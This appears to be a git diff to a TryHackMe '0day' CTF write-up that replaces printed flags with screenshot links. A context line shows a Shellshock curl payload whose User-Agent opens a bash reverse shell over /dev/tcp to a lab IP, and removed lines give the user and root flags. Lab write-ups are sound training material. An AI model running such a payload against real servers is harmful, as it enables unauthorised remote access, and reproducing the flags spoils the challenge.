@@ -1,3 +1,5 @@
+![Congrats](../assets/screenshots/0day/0day%20congrats.jpg)
+
 # 0day TryHackMe Machine CTF
 
 Step by step and errors I ran into:
@@ -39,7 +41,8 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.48.90.114/4
 cd /home/ryan
 cat user.txt
 ```
-**Flag:** `THM{Sh3llSh0ck_r0ckz}`
+**Flag:** 
+![User Flag](../assets/screenshots/0day/firstflag%200day.jpg)
 
 ## Step 6: Privilege Escalation to Root
 
@@ -86,7 +89,8 @@ After exploit ran, prompt changed to `#` (root shell):
 ```bash
 cat /root/root.txt
 ```
-**Flag:** `THM{g00d_j0b_0day_is_Pleased}`
+**Flag:** 
+![Root Flag](../assets/screenshots/0day/secondflag%200day.jpg)
 
 ## Tools Used:
 - Nmap 
@@ -99,5 +103,5 @@ cat /root/root.txt
 - Python HTTP Server
 
 ## Final Flags:
-- User: `THM{Sh3llSh0ck_r0ckz}`
-- Root: `THM{g00d_j0b_0day_is_Pleased}`
+- User: ![User Flag](../assets/screenshots/0day/firstflag%200day.jpg)
+- Root: ![Root Flag](../assets/screenshots/0day/secondflag%200day.jpg)
